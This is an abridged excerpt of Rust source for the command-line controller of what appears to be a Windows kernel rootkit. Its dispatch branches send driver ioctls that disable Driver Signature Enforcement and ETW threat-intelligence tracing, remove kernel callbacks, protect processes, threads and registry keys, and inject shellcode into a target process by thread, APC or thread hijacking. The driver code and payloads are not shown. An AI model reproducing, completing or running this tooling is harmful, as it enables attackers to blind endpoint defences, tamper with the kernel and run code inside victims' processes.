...
use common::ioctls::*;
use modules::{
    callback::Callback, driver::Driver, injection::Injection, misc::Misc, module::Module,
    network::Network, process::Process, thread::Thread,
};
use utils::{BANNER, init_logger};
    ...
    match &args.command {
        Commands::Process { sub_command } => {
            ...
            match sub_command {
                ...
                #[cfg(not(feature = "mapper"))]
                ProcessCommands::Protection { pid, add, remove } => match (*add, *remove) {
                    (true, false) => {
        ...
        Commands::Thread { sub_command } => {
            ...
            match sub_command {
                ...
                #[cfg(not(feature = "mapper"))]
                ThreadCommands::Protection { tid, add, remove } => match (*add, *remove) {
        ...
        Commands::Misc { sub_command } => {
            ...
            match sub_command {
                MisCommands::DSE { disable, enable } => match (*enable, *disable) {
                ...
                MisCommands::Etwti { disable, enable } => match (*enable, *disable) {
        ...
        Commands::Registry { sub_command } => {
            ...
            match sub_command {
                RegistryCommands::Protect {
                    ...
                    (true, true) => log::error!(
                        "Both add and remove options cannot be specified at the same time"
                    ),
                    (true, false) | (false, true) => {
                        let action = *add;
                        let reg_type = if name.is_some() {
        ...
        Commands::Callback {
            ...
            match (remove, restore) {
                ...
                (None, Some(index)) => {
                    callbacks.restore_callback(*index, RESTORE_CALLBACK, callback)
                }
        ...
        Commands::Injection { sub_command } => {
            ...
            match sub_command {
                ...
                InjectionCommands::Shellcode { pid, path, type_ } => match type_ {
                    InjectionTypes::Thread => {
                        injection.injection(INJECTION_SHELLCODE_THREAD, pid, path)
                    }
                    InjectionTypes::APC => injection.injection(INJECTION_SHELLCODE_APC, pid, path),
                    InjectionTypes::ThreadHijacking => {
                        injection.injection(INJECTION_SHELLCODE_THREAD_HIJACKING, pid, path)
                    }
                },
            }
        }
